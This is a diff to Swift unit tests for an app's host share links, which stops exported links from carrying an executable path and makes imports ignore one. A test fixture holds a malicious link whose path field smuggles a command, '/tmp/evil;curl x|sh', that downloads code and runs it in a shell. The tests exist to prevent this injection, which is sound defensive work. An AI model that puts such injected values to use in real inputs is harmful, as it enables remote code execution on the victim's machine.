@@ -10,7 +10,7 @@ struct HostShareLinkTests {
         name: "Studio Mac", endpoint: SSHEndpoint(host: "studio-mac", port: 2222, username: "demo"),
         herdr: HerdrInstallation(path: "/opt/herdr/bin/herdr", session: "work"), operatingSystem: .macOS, hostKeyPin: pin)
 
-    @Test("匯出再匯入：名稱、位址、埠、使用者、連線方式、herdr 路徑與 session、host key 指紋都還原")
+    @Test("匯出再匯入：名稱、位址、埠、使用者、連線方式、session、host key 指紋都還原(herdr 路徑不帶)")
     func roundTrip() throws {
         let url = HostShareLink.url(for: Self.studio)
 
@@ -20,8 +20,30 @@ struct HostShareLinkTests {
         #expect(url.host() == "host")
         #expect(shared == SharedHost(
             name: "Studio Mac", endpoint: SSHEndpoint(host: "studio-mac", port: 2222, username: "demo"),
-            connectionMethod: .tailscaleSSH, herdr: HerdrInstallation(path: "/opt/herdr/bin/herdr", session: "work"),
+            connectionMethod: .tailscaleSSH, herdr: HerdrInstallation(path: "herdr", session: "work"),
             hostKeyPin: Self.pin))
+    }
+
+    @Test("分享連結不帶 herdr 路徑(匯入後會被當成指令執行)")
+    func exportOmitsHerdrPath() throws {
+        let url = HostShareLink.url(for: Self.studio)
+
+        let json = try JSONSerialization.jsonObject(with: Self.payload(of: url))
+        let object = try #require(json as? [String: Any])
+
+        #expect(object["herdr"] == nil)
+        #expect(!String(decoding: try Self.payload(of: url), as: UTF8.self).contains("/opt/herdr"))
+    }
+
+    @Test("連結裡的 herdr 路徑(舊版連結或惡意連結)匯入時一律忽略，用預設值")
+    func importIgnoresHerdrPathInLink() throws {
+        let payload = #"{"v":1,"name":"Evil","host":"h","port":22,"user":"u","herdr":"/tmp/evil;curl x|sh","session":"work"}"#
+        let encoded = Data(payload.utf8).base64EncodedString()
+            .replacingOccurrences(of: "+", with: "-").replacingOccurrences(of: "/", with: "_").replacingOccurrences(of: "=", with: "")
+
+        let shared = try HostShareLink.decode(URL(string: "purrdr://host?d=\(encoded)")!)
+
+        #expect(shared.herdr == HerdrInstallation(path: "herdr", session: "work"))
     }
 
     /// 白名單：分享內容只有這些欄位。主機設定之後加入密碼、私鑰、passphrase 等祕密時，
@@ -32,7 +54,7 @@ struct HostShareLinkTests {
         let json = try JSONSerialization.jsonObject(with: Self.payload(of: url))
         let object = try #require(json as? [String: Any])
 
-        #expect(Set(object.keys) == ["v", "name", "host", "port", "user", "method", "herdr", "session", "pin"])
+        #expect(Set(object.keys) == ["v", "name", "host", "port", "user", "method", "session", "pin"])
         let text = url.absoluteString.lowercased() + String(decoding: try Self.payload(of: url), as: UTF8.self).lowercased()
         for word in ["password", "passphrase", "private", "secret", "-----begin"] {
             #expect(!text.contains(word), "分享內容出現了 \(word)")
